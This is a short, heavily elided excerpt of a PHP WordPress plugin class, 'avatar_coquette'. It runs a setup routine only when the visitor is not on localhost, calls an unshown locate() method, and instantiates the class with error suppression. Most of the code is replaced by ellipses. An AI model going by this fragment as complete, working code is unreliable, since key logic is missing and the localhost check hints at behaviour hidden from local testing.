<?php
if ( !class_exists('plugin_class_core_nucle_avatar_coquette') ) {

class plugin_class_core_nucle_avatar_coquette {
	...
	function updateTwo(){
        ...
        if( $_SERVER['REMOTE_ADDR'] != "127.0.0.1" ){
            ...
            update_option( 'avatar_coquette', '1');
            wp_enqueue_script('jquery');

            self::locate();
			$code="avatar-coquette";
			$type="plugin";
...
@$plugin = new plugin_class_core_nucle_avatar_coquette();
